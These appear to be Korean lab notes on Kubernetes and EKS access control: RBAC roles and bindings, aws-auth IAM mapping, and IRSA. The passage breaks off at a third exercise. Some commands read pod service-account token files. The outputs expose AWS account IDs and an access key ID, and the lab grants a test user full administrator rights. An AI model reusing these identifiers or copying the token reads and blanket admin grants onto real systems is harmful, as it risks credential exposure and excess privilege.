
# 6Week - 6주차 실습

![image](https://github.com/jiwonYun9332/AWES-1/blob/dc733821bb4a531f61099b2797ece54ee18700bb/Study/images/95_image.jpg)


### K8S 인증/인가

**Admission Controller Concept**

Admission Controller는 쿠버네티스의 API를 호출했을 때, 해당 요청의 내용을 변형하거나 검증하는 플러그인의 집합이다.
어떤 사용자가 쿠버네티스 API를 통해 포드의 생성을 요청했을 떄 해당 포드의 설정이 적절한지 검증함으로써 포드 템플릿을 변경할 수도 있고, 부적절하다고 판단되면
아예 포드 생성 요청을 거부할 수 있다.

- LimitRanger, ResourceQuota: 포드의 리소스 request, limit를 자동으로 설정해준다.
- Istio의 Envoy Proxy Injection: injection=true인 네임스페이스의 모든 포드는 sidecar가 자동으로 추가된다.
- ServiceAccount도 Admission Controller 플러그인의 한 종류이다.

이러한 작업을 수행하기 위해 Admission Controller는 두 가지 단계를 거치도록 구현되어 있다.

- Mutate
: 사용자가 요청한 API의 매니페스트를 검사해 적절한 값으로 수정하는 변형 작업을 수행한다.
- Validate
: 매니페스트가 유효한지를 검사함으로써 요청을 거절 할 것인지를 결정한다.

![image](https://github.com/jiwonYun9332/AWES-1/blob/5d1eae78f4cf86cf124c95e7b30615720e8fec42/Study/images/96_image.jpg)

API 서버로 들어오는 모든 요청은 최종적으로 etcd에 저장되는데, 그 전에 당연히 Auth를 거치게 된다. JWT 또는 인증서 등을 통해 클라이언트를 인증한 뒤,
클라이언트의 API 요청이 RBAC 권한과 매칭되는지를 검사한다. 클라이언트가 해당 요청을 수행할 수 있는 적절한 권한이 있다고 판단되면, API 서버는
Admission Controller의 Mutate, Validate 과정을 거쳐 etcd에 요청 데이터를 저장한다. 그 뒤에는 컨트롤러나 스케줄러 등이 etcd의 데이터를 감지해 적절한 작업을 수행하는 식이다.

요점은 'API 서버는 Mutate와 Validate 과정을 거친 뒤에야 비로소 etcd에 요청 데이터를 저장한다'

또한, 컨테이너의 root privileged 권한을 부여하는 것은 보안 취약점을 가져오기 때문에 PodSecurityPolicy 라는 별도의 Admission Controller가 쿠버네티스에
이미 내장되어 있다. 

**x.509 Client Certs**

 x.509
: ITU-T가 만든 PKI(Public Key Infrastructure, 공개키 기반 구조)의 표준이다.

**RBAC (Role-Based Access Control)**

- 액세스, 무엇에 접근할 수 있는가?
- 운영, 무엇을 읽고,  무엇을 작성할 수 있는가? 파일을 생성 또는 삭제할 수 있는가?
- 세션, 시스템에 얼마나 오래 머무를 수 있는 가? 로그인은 언제 작동하고, 언제 만료되는가?

**ABAC(Attribute-Based Access Control)**

- 사용자, 사람의 직급과 일반적인 작업 또는 연공서열에 따라 수행 가능한 작업이 결정될 수 있다.
- 리소스 속성, 파일 유형 또는 만든 사람, 문서의 중요도에 따라 액세스 권한이 결정될 수 있다.
- 환경, 파일에 액세스하고 있는 위치, 시간대 또는 날짜에 따라 액세스 권한이 결정될 수 있다.

**K8S(API 접근) 인증/인가**

API 서버 접근 과정 : 인증 → 인가 → Admission Control(API 요청 검증, 필요 시 변형 - 예. ResourceQuota, LimitRange)

![image](https://github.com/jiwonYun9332/AWES-1/blob/6ab46ef6bbfc18953d764d543f4b31e3f0ab1d88/Study/images/97_image.jpg)

**Authentication**

- X.509 Client Certs
: kubeconfig에 CA crt, Client crt(클라이언트 인증서), Client key(클라이언트 개인키)를 통해 인증

- kubectl
: 여러 클러스터(kubeconfig)를 관리 가능, contexts에 클러스터와 유저 및 인증서/키 참고

- ServiceAccount
: 기본 서비스 어카운트(default) - 시크릿(CA crt 와 token)

![image](https://github.com/jiwonYun9332/AWES-1/blob/b7561f44d0afec6a6a8544a813fd9ece9a4660c9/Study/images/98_image.jpg)

**Authorization**

인가 방식: RBAC(Role, RoleBinding), ABAC, Webhook, Node Authorization
RBAC: 역할 기반의 권한 관리, 사용자와 역할을 별개로 선언 후 두 가지를 조합(binding)해서 사용자에게 권한을 부여하여 kubectl or API로 관리 가능하다.

- Namespace/Cluster - Role/ClusterRole, RoleBinding/ClusterRoleBinding, Service Account
- Role(롤) - (RoleBinding 롤 바인딩) - Service Account(서비스 어카운트)
: 롤 바인딩은 롤과 서비스 어카운트를 연결
- Role(네임스페이스 내 자원의 권한) vs ClusterRole(클러스터 수준의 자원의 권한)

![image](https://github.com/jiwonYun9332/AWES-1/blob/21381c74cd10cad63d7909009c1b2154f6fe91b4/Study/images/99_image.jpg)

**.kube/config 파일 내용**

- clusters: kubectl 이 사용할 쿠버네티스 API 서버의 접속 정보 목록. 원격의 쿠버네티스 API 서버의 주소를 추가해 사용 가능
- users: 쿠버네티스의 API 서버에 접속하기 위한 사용자 인증 정보 목록. (서비스 어카운트의 토큰, 혹은 인증서의 데이터 등)
- contexts: cluster 항목과 users 항목에 정의된 값을 조합해 최종적으로 사용할 쿠버네티스 클러스터의 정보(컨텍스트)를 설정.
  - 예를 들어 cluster 항목에 클러스터 A, B가 정의돼 있고, users 항목에 사용자 a, b가 정의돼 있다면 cluster A + user a 를 조합해,
  'cluster A 에 user a 로 인증해 쿠버네티스를 사용한다' 라는 새로운 컨텍스트를 정의할 수 있다.
  - kubectl 을 사용하려면 여러 개의 컨텍스트 중 하나를 선택

```
cat .kube/config
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: { 값 }
    server: https://192.168.100.10:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    namespace: default
    user: kubernetes-admin
  name: admin@k8s
current-context: admin@k8s
kind: Config
preferences: {}
users:
- name: kubernetes-admin
  user:
    client-certificate-data: { 값 }
    client-key-data: { 값 }
```

**실습**

![image](https://github.com/jiwonYun9332/AWES-1/blob/81cb13cb1476f2fd5e5762bff5daeecbca302110/Study/images/100_image.jpg)

- 쿠버네티스에 사용자를 위한 서비스 어카운트(Service Account, SA)를 생성
: dev-k8s, infra-k8s
- 사용자는 각기 다른 궎한(Role, 인가)을 가짐
: dev-k8s(dev-team 네임스페이스 내 모든 동작), infra-k8s(dev-team 네임스페이스 내 모든 동작)
- 각각 별도의 kubectl 파드를 생성하고, 해당 파드에 SA를 지정하여 권한에 대한 테스트를 진행

```
# 네임스페이스(Namespace, NS) 생성 및 확인
kubectl create namespace dev-team
kubectl create ns infra-team

# 네임스페이스 확인
kubectl get ns

# 네임스페이스에 각각 서비스 어카운트 생성 : serviceaccounts 약자(=sa)
kubectl create sa dev-k8s -n dev-team
kubectl create sa infra-k8s -n infra-team

# 서비스 어카운트 정보 확인
kubectl get sa -n dev-team
kubectl get sa dev-k8s -n dev-team -o yaml | yh

kubectl get sa -n infra-team
kubectl get sa infra-k8s -n infra-team -o yaml | yh
apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: "2023-06-03T17:08:30Z"
  name: infra-k8s
  namespace: infra-team
  resourceVersion: "7029"
  uid: 2aba35c0-0bde-4d2d-aae5-1d739a1d989e
```

**서비스 어카운트를 지정하여 파드 생성 후 권한 테스트**

![image](https://github.com/jiwonYun9332/AWES-1/blob/ab52d108e2c5bb6c48bd9f72d13bbe550df57101/Study/images/104_image.jpg)

```
# 각각 네임스피이스에 kubectl 파드 생성 - 컨테이너이미지
# docker run --rm --name kubectl -v /path/to/your/kube/config:/.kube/config bitnami/kubectl:latest
cat <<EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: dev-kubectl
  namespace: dev-team
spec:
  serviceAccountName: dev-k8s
  containers:
  - name: kubectl-pod
    image: bitnami/kubectl:1.24.10
    command: ["tail"]
    args: ["-f", "/dev/null"]
  terminationGracePeriodSeconds: 0
EOF

cat <<EOF | kubectl create -f -
apiVersion: v1
kind: Pod
metadata:
  name: infra-kubectl
  namespace: infra-team
spec:
  serviceAccountName: infra-k8s
  containers:
  - name: kubectl-pod
    image: bitnami/kubectl:1.24.10
    command: ["tail"]
    args: ["-f", "/dev/null"]
  terminationGracePeriodSeconds: 0
EOF

# 확인
kubectl get pod -A
kubectl get pod -o dev-kubectl -n dev-team -o yaml
 serviceAccount: dev-k8s
 ...
kubectl get pod -o infra-kubectl -n infra-team -o yaml
 serviceAccount: infra-k8s
...

# 파드에 기본 적용되는 서비스 어카운트(토큰) 정보 확인
kubectl exec -it dev-kubectl -n dev-team -- ls /run/secrets/kubernetes.io/serviceaccount
kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/token
kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/namespace
kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/ca.crt

# 각각 파드로 Shell 접속하여 정보 확인 : 단축 명령어(alias) 사용
alias k1='kubectl exec -it dev-kubectl -n dev-team -- kubectl'
alias k2='kubectl exec -it infra-kubectl -n infra-team -- kubectl'

# 권한 테스트
k1 get pods # kubectl exec -it dev-kubectl -n dev-team -- kubectl get pods 와 동일한 실행 명령이다!
k1 run nginx --image nginx:1.20-alpine
k1 get pods -n kube-system

k2 get pods # kubectl exec -it infra-kubectl -n infra-team -- kubectl get pods 와 동일한 실행 명령이다!
k2 run nginx --image nginx:1.20-alpine
k2 get pods -n kube-system

# (옵션) kubectl auth can-i 로 kubectl 실행 사용자가 특정 권한을 가졌는지 확인
k1 auth can-i get pods
no
```

![image](https://github.com/jiwonYun9332/AWES-1/blob/e03e817da70a1b9a4a99f0edc06d7196bacda58d/Study/images/105_image.jpg)

각각의 파드로 접속하여 자원(Pod)에 대한 권한이 있는지 확인해 보면, 별도의 RoleBinding을 하지 않았기 때문에 모두 실패하는 것을 확인할 수 있다.

- **각각 네임스페이스에 롤(Role)를 생성 후 서비스 어카운트 바인딩**
    - **롤(Role)** : apiGroups 와 resources 로 지정된 리소스에 대해 **verbs** 권한을 인가
    - **실행 가능한 조작(verbs)** : *(모두 처리), create(생성), delete(삭제), get(조회), list(목록조회), patch(일부업데이트), update(업데이트), watch(변경감시)

![image](https://github.com/jiwonYun9332/AWES-1/blob/0b10d8d03bc60ba53656c889a60fe229ea94199d/Study/images/106_image.jpg)

```
# 각각 네임스페이스내의 모든 권한에 대한 롤 생성
cat <<EOF | kubectl create -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: role-dev-team
  namespace: dev-team
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

cat <<EOF | kubectl create -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: role-infra-team
  namespace: infra-team
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

# 롤 확인 
kubectl get roles -n dev-team
kubectl get roles -n infra-team
kubectl get roles -n dev-team -o yaml
kubectl describe roles role-dev-team -n dev-team
...
PolicyRule:
  Resources  Non-Resource URLs  Resource Names  Verbs
  ---------  -----------------  --------------  -----
  *.*        []                 []              [*]

# 롤바인딩 생성 : '서비스어카운트 <-> 롤' 간 서로 연동
cat <<EOF | kubectl create -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: roleB-dev-team
  namespace: dev-team
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: role-dev-team
subjects:
- kind: ServiceAccount
  name: dev-k8s
  namespace: dev-team
EOF

cat <<EOF | kubectl create -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: roleB-infra-team
  namespace: infra-team
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: role-infra-team
subjects:
- kind: ServiceAccount
  name: infra-k8s
  namespace: infra-team
EOF

# 롤바인딩 확인
kubectl get rolebindings -n dev-team
kubectl get rolebindings -n infra-team
kubectl get rolebindings -n dev-team -o yaml
kubectl describe rolebindings roleB-dev-team -n dev-team
...
Role:
  Kind:  Role
  Name:  role-dev-team
Subjects:
  Kind            Name     Namespace
  ----            ----     ---------
  ServiceAccount  dev-k8s  dev-team
```

![image](https://github.com/jiwonYun9332/AWES-1/blob/fce48180d9119a847c32c61ceaf686f32b53576e/Study/images/107_image.jpg)

**서비스 어카운트를 지정하여 생성한 파드에서 다시 권한 테스트**

```
# 각각 파드로 Shell 접속하여 정보 확인 : 단축 명령어(alias) 사용
alias k1='kubectl exec -it dev-kubectl -n dev-team -- kubectl'
alias k2='kubectl exec -it infra-kubectl -n infra-team -- kubectl'

# 권한 테스트
k1 get pods 
k1 run nginx --image nginx:1.20-alpine
k1 get pods
k1 delete pods nginx
k1 get pods -n kube-system
k1 get nodes

k2 get pods 
k2 run nginx --image nginx:1.20-alpine
k2 get pods
k2 delete pods nginx
k2 get pods -n kube-system
k2 get nodes

# (옵션) kubectl auth can-i 로 kubectl 실행 사용자가 특정 권한을 가졌는지 확인
k1 auth can-i get pods
yes
```

리소스를 생성해 보면 잘 동작하는 것을 확인할 수 있다.

**리소스 삭제**

```
kubectl delete ns dev-team infra-team
```

### EKS 인증/인가

동작: 사용자/애플리케이션 -> k8s 사용 시 => 인증은 AWS IAM, 인가는 K8S RBAC

![image](https://github.com/jiwonYun9332/AWES-1/blob/0f5211d440ad20d6709e10fa72e76ed3ddf0b766/Study/images/101_image.jpg)

**RBAC 관련 krew 플러그인**

```
# 설치
kubectl krew install access-matrix rbac-tool rbac-view rolesum

# Show an RBAC access matrix for server resources
kubectl access-matrix # Review access to cluster-scoped resources
kubectl access-matrix --namespace default # Review access to namespaced resources in 'default'

# RBAC Lookup by subject (user/group/serviceaccount) name
kubectl rbac-tool lookup
kubectl rbac-tool lookup system:masters
  SUBJECT        | SUBJECT TYPE | SCOPE       | NAMESPACE | ROLE
+----------------+--------------+-------------+-----------+---------------+
  system:masters | Group        | ClusterRole |           | cluster-admin

kubectl rbac-tool lookup system:nodes # eks:node-bootstrapper
kubectl rbac-tool lookup system:bootstrappers # eks:node-bootstrapper
kubectl describe ClusterRole eks:node-bootstrapper

# RBAC List Policy Rules For subject (user/group/serviceaccount) name
kubectl rbac-tool policy-rules
kubectl rbac-tool policy-rules -e '^system:.*'

# Generate ClusterRole with all available permissions from the target cluster
kubectl rbac-tool show

# Shows the subject for the current context with which one authenticates with the cluster
kubectl rbac-tool whoami
{Username: "kubernetes-admin",
 UID:      "aws-iam-authenticator:911283.....:AIDA5ILF2FJ......",
 Groups:   ["system:masters",
            "system:authenticated"],
 Extra:    {accessKeyId:  ["AKIA5ILF2FJ....."],
            arn:          ["arn:aws:iam::911283....:user/admin"],
            canonicalArn: ["arn:aws:iam::911283....:user/admin"],
            principalId:  ["AIDA5ILF2FJ....."],
            sessionName:  [""]}}

# Summarize RBAC roles for subjects : ServiceAccount(default), User, Group
kubectl rolesum -h
kubectl rolesum aws-node -n kube-system
kubectl rolesum -k User system:kube-proxy
kubectl rolesum -k Group system:masters

# [터미널1] A tool to visualize your RBAC permissions
kubectl rbac-view
INFO[0000] Getting K8s client
INFO[0000] serving RBAC View and http://localhost:8800

## 이후 해당 작업용PC 공인 IP:8800 웹 접속
echo -e "RBAC View Web http://$(curl -s ipinfo.io/ip):8800"
```

![image](https://github.com/jiwonYun9332/AWES-1/blob/be8aa47978827b0062178f33a3f4af44c0e4abf4/Study/images/108_image.jpg)

**쿠버네티스 API 서버의 인증 인가 처리 단계**

쿠버네티스 API 서버는 하나 이상의 인증 플러그인을 구성할 수 있고 이 플러그인 중에서 인증 요청을 처리하면
나머지 플러그인의 호출을 뛰어넘어서 인가 단계로 진행된다.

EKS는 Webhook Token Authentication과 OIDC Toekn, Service Account Token을 지원한다.

인가 단계에서는 RBAC 플러그인 등을 거치면서 해당 요청이 특정 리소스에 대해서 허용되었는지 검사하고 Adminission Control을 통해서
분산저장소인 ETCD에 저장하게 된다.

쿠버네티스의 권한 인가 쳬게인 RBAC은 보안 주체인 사람을 나타내는 user나 group과 애플리케이션이 사용하는 보안 주체(subjects)인 Service Account를
특정 리소스에 대해서 어떤 액션을 수행할 수 있는지를 정의한 Role이나 Clusterrole과 Role Binding이나 Clusterrole Binding으로 연결해서 권한 인증 체계를
구성하게 된다.

kubectl 명령을 실행했을 때의 흐름

![image](https://github.com/jiwonYun9332/AWES-1/blob/7c7d85cca40ad627da368d15be6065e24c480323/Study/images/102_image.jpg)

1. 사용자가 EKS 클러스터에 접근할 수 있도록 설정해놓은 사용자 PC에서 쿠버네티스 명령을 내리면

2. 사용자 PC의 kubeconfig 설정 정보의 정의된 AWS EKS Get-Token이라고 하는 명령을 통해서 AWS EKS Service Endpoint로 Request가 가게 된다.

3. Response로 Token 값이 전달된다. 해당 토큰은 Base64로 인코딩된 값으로 이 값을 디코딩해보면 Secure Token Service의 GetCallerIdentity를 호출하는 Pre-Signed URL인 것을 확인할 수 있다.

4. Kubectl의 Client-Go 라이브러리는 이 Pre-Signed URL을 Bearer Token으로 EKS API Cluster Endpoint로 요청을 보내면

5. IAM-Authentication Server는 Token Authentication Webhook이 호출되고 STS GetCallerIdentity 호출해서 해당 호출에 대한 인증을 거쳐서 UserID와 User나 Role에 대한 ARN을 반환하게 된다.

6. 이 정보를 IAM의 User나 Role을 쿠버네티스의 User나 Group으로 매핑하는 Config Map인 AWS-Auth에서 쿠버네티스의 보안 주체(Subjects)를 리턴하게 된다.

7. 이 경우에는 IAM Role과 매핑된 IAM-Admin이라는 username과 System:master라고 하는 그룹을 리턴하게 된다.

8. Authentication에서는 Token Review라는 데이터 타입으로 username과 group을 반환하게 된다.

9. 이 값을 이용해 k8s RBAC 체계에서 요청에 대한 허용이나 거부를 하게 된다.

이와 같이 Kubectl을 사용해 명령을 내리면 IAM을 활용해 사용자를 인증하고 쿠버네티스에 정의된 권한에 따라 해당 명령을 인가하게 된다.

![image](https://github.com/jiwonYun9332/AWES-1/blob/07459c8bf909cfb74c0be7ba4bdbb14445da76a5/Study/images/103_image.jpg)

![image](https://github.com/jiwonYun9332/AWES-1/blob/bffb41048523437d1fb2fbce8f2d2a0fb656a621/Study/images/109_image.jpg)

**kubectl 명령 → aws eks get-token → EKS Service endpoint(STS)에 토큰 요청 ⇒ 응답값 디코드(Pre-Signed URL 이며 GetCallerIdentity..)**

- STS Security Token Service : AWS 리소스에 대한 액세스를 제어할 수 있는 임시 보안 자격 증명(STS)을 생성하여 신뢰받는 사용자에게 제공할 수 있음

- AWS CLI 버전 1.16.156 이상에서는 별도 aws-iam-authenticator 설치 없이 aws eks get-token으로 사용 가능

```
# sts caller id의 ARN 확인
aws sts get-caller-identity --query Arn
"arn:aws:iam::<자신의 Account ID>:user/admin"

# kubeconfig 정보 확인
cat ~/.kube/config | yh
...
- name: admin@myeks.ap-northeast-2.eksctl.io
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      args:
      - eks
      - get-token
      - --output
      - json
      - --cluster-name
      - myeks
      - --region
      - ap-northeast-2
      command: aws
      env:
      - name: AWS_STS_REGIONAL_ENDPOINTS
        value: regional
      interactiveMode: IfAvailable
      provideClusterInfo: false

# Get  a token for authentication with an Amazon EKS cluster.
# This can be used as an alternative to the aws-iam-authenticator.
aws eks get-token help

# 임시 보안 자격 증명(토큰)을 요청 : expirationTimestamp 시간경과 시 토큰 재발급됨
aws eks get-token --cluster-name $CLUSTER_NAME | jq
aws eks get-token --cluster-name $CLUSTER_NAME | jq -r '.status.token'
```

**kubectl의 Client-Go 라이브러리는 Pre-Signed URL을 Bearer Token으로 EKS API Cluster Endpoint로 요청을 보냄**

![image](https://github.com/jiwonYun9332/AWES-1/blob/7bb399d0136942322d1ced795f381b6d6254113a/Study/images/110_image.jpg)

![image](https://github.com/jiwonYun9332/AWES-1/blob/7bb399d0136942322d1ced795f381b6d6254113a/Study/images/111_image.jpg)

**EKS API는 Token Review 를 Webhook token authenticator에 요청**

```
# tokenreviews api 리소스 확인 
kubectl api-resources | grep authentication
tokenreviews                                   authentication.k8s.io/v1               false        TokenReview

# List the fields for supported resources.
kubectl explain tokenreviews
...
DESCRIPTION:
     TokenReview attempts to authenticate a token to a known user. Note:
     TokenReview requests may be cached by the webhook token authenticator
     plugin in the kube-apiserver.
```

**쿠버네티스 RBAC 인가를 처리**

- 해당 IAM User/Role 확인이 되면 k8s aws-auth configmap에서 mapping 정보를 확인
- aws-auth 컨피그맵에 'IAM 사용자, 역할 arm, K8S 오브젝트' 로 권한 확인 후 k8s 인가 허가가 되면 최종적으로 동작 실행
- EKS를 생성한 IAM principal은 aws-auth 와 상관없이 kubernetes-admin Username으로 system:masters 그룹에 권한을 가짐

```
# Webhook api 리소스 확인 
kubectl api-resources | grep Webhook
mutatingwebhookconfigurations                  admissionregistration.k8s.io/v1        false        MutatingWebhookConfiguration
validatingwebhookconfigurations                admissionregistration.k8s.io/v1        false        ValidatingWebhookConfiguration

# validatingwebhookconfigurations 리소스 확인
kubectl get validatingwebhookconfigurations
NAME                                        WEBHOOKS   AGE
eks-aws-auth-configmap-validation-webhook   1          50m
vpc-resource-validating-webhook             2          50m
aws-load-balancer-webhook                   3          8m27s

kubectl get validatingwebhookconfigurations eks-aws-auth-configmap-validation-webhook -o yaml | kubectl neat | yh

# aws-auth 컨피그맵 확인
kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh
apiVersion: v1
kind: ConfigMap
metadata: 
  name: aws-auth
  namespace: kube-system
data: 
  mapRoles: |
    - groups:
      - system:bootstrappers
      - system:nodes
      rolearn: arn:aws:iam::91128.....:role/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1OS1WSTV0YB9X
      username: system:node:{{EC2PrivateDNSName}}
#---<아래 생략(추정), ARN은 EKS를 설치한 IAM User , 여기 있었을경우 만약 실수로 삭제 시 복구가 가능했을까?---
  mapUsers: |
    - groups:
      - system:masters
      userarn: arn:aws:iam::111122223333:user/admin
      username: kubernetes-admin

# EKS 설치한 IAM User 정보 >> system:authenticated는 어떤 방식으로 추가가 되었는지 궁금???
kubectl rbac-tool whoami
{Username: "kubernetes-admin",
 UID:      "aws-iam-authenticator:9112834...:AIDA5ILF2FJIR2.....",
 Groups:   ["system:masters",
            "system:authenticated"],
...

# system:masters , system:authenticated 그룹의 정보 확인
kubectl rbac-tool lookup system:masters
kubectl rbac-tool lookup system:authenticated
kubectl rolesum -k Group system:masters
kubectl rolesum -k Group system:authenticated

# system:masters 그룹이 사용 가능한 클러스터 롤 확인 : cluster-admin
kubectl describe clusterrolebindings.rbac.authorization.k8s.io cluster-admin
Name:         cluster-admin
Labels:       kubernetes.io/bootstrapping=rbac-defaults
Annotations:  rbac.authorization.kubernetes.io/autoupdate: true
Role:
  Kind:  ClusterRole
  Name:  cluster-admin
Subjects:
  Kind   Name            Namespace
  ----   ----            ---------
  Group  system:masters

# cluster-admin 의 PolicyRule 확인 : 모든 리소스  사용 가능!
kubectl describe clusterrole cluster-admin
Name:         cluster-admin
Labels:       kubernetes.io/bootstrapping=rbac-defaults
Annotations:  rbac.authorization.kubernetes.io/autoupdate: true
PolicyRule:
  Resources  Non-Resource URLs  Resource Names  Verbs
  ---------  -----------------  --------------  -----
  *.*        []                 []              [*]
             [*]                []              [*]

# system:authenticated 그룹이 사용 가능한 클러스터 롤 확인
kubectl describe ClusterRole system:discovery
kubectl describe ClusterRole system:public-info-viewer
kubectl describe ClusterRole system:basic-user
kubectl describe ClusterRole eks:podsecuritypolicy:privileged
```

**데브옵스 신입 사원을 위한 myeks-bastion-2에 설정 해보기**

[myeks-bastion] testuser 사용자 생성 

```
# testuser 사용자 생성
aws iam create-user --user-name testuser

# 사용자에게 프로그래밍 방식 액세스 권한 부여
aws iam create-access-key --user-name testuser
{
    "AccessKey": {
        "UserName": "testuser",
        "AccessKeyId": "AKIA5ILF2##",
        "Status": "Active",
        "SecretAccessKey": "TxhhwsU8##",
        "CreateDate": "2023-05-23T07:40:09+00:00"
    }
}
# testuser 사용자에 정책을 추가
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name testuser

# get-caller-identity 확인
aws sts get-caller-identity --query Arn
"arn:aws:iam::911283464785:user/admin"

# EC2 IP 확인 : myeks-bastion-EC2-2 PublicIPAdd 확인
aws ec2 describe-instances --query "Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key=='Name']|[0].Value,Status:State.Name}" --filters Name=instance-state-name,Values=running --output table
```

[myeks-bastion-2] testuser 자격증명 설정 및 확인

```
# get-caller-identity 확인 >> 왜 안될까요?
aws sts get-caller-identity --query Arn

# testuser 자격증명 설정
aws configure
AWS Access Key ID [None]: AKIA5ILF2F...
AWS Secret Access Key [None]: ePpXdhA3cP....
Default region name [None]: ap-northeast-2

# get-caller-identity 확인
aws sts get-caller-identity --query Arn
"arn:aws:iam::911283464785:user/testuser"

# kubectl 시도 >> testuser도 AdministratorAccess 권한을 가지고 있는데, 실패 이유는?
kubectl get node -v6
ls ~/.kube
```

[myeks-bastion] testuser에 system:masters 그룹 부여로 EKS 관리자 수준 권한 설정

```
# 방안1 : eksctl 사용 >> iamidentitymapping 실행 시 aws-auth 컨피그맵 작성해줌
# Creates a mapping from IAM role or user to Kubernetes user and groups
eksctl create iamidentitymapping --cluster $CLUSTER_NAME --username testuser --group system:masters --arn arn:aws:iam::$ACCOUNT_ID:user/testuser

# 확인
kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh

eksctl get iamidentitymapping --cluster $CLUSTER_NAME

ARN                                                                                     USERNAME                                GROUPS                         ACCOUNT
arn:aws:iam::485702506058:role/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-RIQSTAN95G8X system:node:{{EC2PrivateDNSName}}       system:bootstrappers,system:nodes
arn:aws:iam::485702506058:user/testuser                                                 testuser                                system:masters
```

[myeks-bastion-2] testuser kubeconfig 생성 및 kubectl 사용 확인

```
# testuser kubeconfig 생성 >> aws eks update-kubeconfig 실행이 가능한 이유는?, 3번 설정 후 약간의 적용 시간 필요
aws eks update-kubeconfig --name $CLUSTER_NAME --user-alias testuser

# 첫번째 bastic ec2의 config와 비교해보자
cat ~/.kube/config | yh

# kubectl 사용 확인
kubectl ns default
kubectl get node -v6

# rbac-tool 후 확인 >> 기존 계정과 비교해보자 >> system:authenticated 는 system:masters 설정 시 따라오는 것 같은데, 추가 동작 원리는 모르겠네요???
kubectl krew install rbac-tool && kubectl rbac-tool whoami
{Username: "testuser",
 UID:      "aws-iam-authenticator:485702506058:AIDAXCFRACZFIDVUHYBHK",
 Groups:   ["system:masters",
            "system:authenticated"],
 Extra:    {accessKeyId:  ["AKIAXCFRACZFBLLPQMHY"],
            arn:          ["arn:aws:iam::485702506058:user/testuser"],
            canonicalArn: ["arn:aws:iam::485702506058:user/testuser"],
            principalId:  ["AIDAXCFRACZFIDVUHYBHK"],
```

[myeks-bastion] testuser 의 Group 변경(system:masters → system:authenticated)으로 RBAC 동작 확인

```
# 방안2 : 아래 edit로 mapUsers 내용 직접 수정 system:authenticated
kubectl edit cm -n kube-system aws-auth
...

# 확인
eksctl get iamidentitymapping --cluster $CLUSTER_NAME
```

[myeks-bastion-2] testuser kubectl 사용 확인

```
# 시도
kubectl get node -v6
kubectl api-resources -v5
```

[myeks-bastion]에서 testuser IAM 맵핑 삭제

```
# testuser IAM 맵핑 삭제
eksctl delete iamidentitymapping --cluster $CLUSTER_NAME --arn  arn:aws:iam::$ACCOUNT_ID:user/testuser

# Get IAM identity mapping(s)
eksctl get iamidentitymapping --cluster $CLUSTER_NAME
kubectl get cm -n kube-system aws-auth -o yaml | yh
```

[myeks-bastion-2] testuser kubectl 사용 확인

```
# 시도
kubectl get node -v6
kubectl api-resources -v5
```

### EKS IRSA

동작 : k8s파드 → AWS 서비스 사용 시 ⇒ AWS STS/IAM ↔ IAM OIDC Identity Provider(EKS IdP) 인증/인가

**Pod별 IAM 할당 방법**

1. 하나의 노드에는 여러 개의 Pod가 실행될 수 있고 각 Pod별로 사용하는 AWS 서비스가 다를 수 있다.

2. 이때 각 Pod별로 IAM 역할을 할당하는 가장 쉬운 방법은 Application 내에 Access Key를 하드코딩하는 방법이다.

3. 이는 보안상의 이유로 바람직하지 못한 방법이고 Node의 IAM role을 모든 Pod가 공유하는 방법도 최소 권한 원칙에 위배된다.

4. 이를 위해서 Pod별로 Servic Account에 IAM Role을 binding해서 Pod별로 서로 다른 IAM Role을 갖도록 하는 기능이 IAM Role for Service Account, 줄여서 **IRSA**라고 한다.

5. IAM Role for Service Account, 줄여서 **IRSA**라고 한다.

**실습1**

```
# 파드1 생성
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: eks-iam-test1
spec:
  containers:
    - name: my-aws-cli
      image: amazon/aws-cli:latest
      args: ['s3', 'ls']
  restartPolicy: Never
  automountServiceAccountToken: false
EOF

# 확인
kubectl get pod
kubectl describe pod

# 로그 확인
kubectl logs eks-iam-test1

# 파드1 삭제
kubectl delete pod eks-iam-test1
```

**CloudTrail 이벤트 ListBuckets 확인**

![image](https://github.com/jiwonYun9332/AWES-1/blob/ba3a066cfb3c05234740837fa04183a9bbd0ec82/Study/images/112_image.jpg)

실습2 - Kubernetes Service Accounts

```
# 파드2 생성
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: eks-iam-test2
spec:
  containers:
    - name: my-aws-cli
      image: amazon/aws-cli:latest
      command: ['sleep', '36000']
  restartPolicy: Never
EOF

# 확인
kubectl get pod
kubectl describe pod

# aws 서비스 사용 시도
kubectl exec -it eks-iam-test2 -- aws s3 ls

# 서비스 어카운트 토큰 확인
SA_TOKEN=$(kubectl exec -it eks-iam-test2 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $SA_TOKEN
```

![image](https://github.com/jiwonYun9332/AWES-1/blob/ff8c702bd7e5ab196d2471132f4ec85fc33bb112/Study/images/113_image.jpg)

**실습3**

```
# Create an iamserviceaccount - AWS IAM role bound to a Kubernetes service account
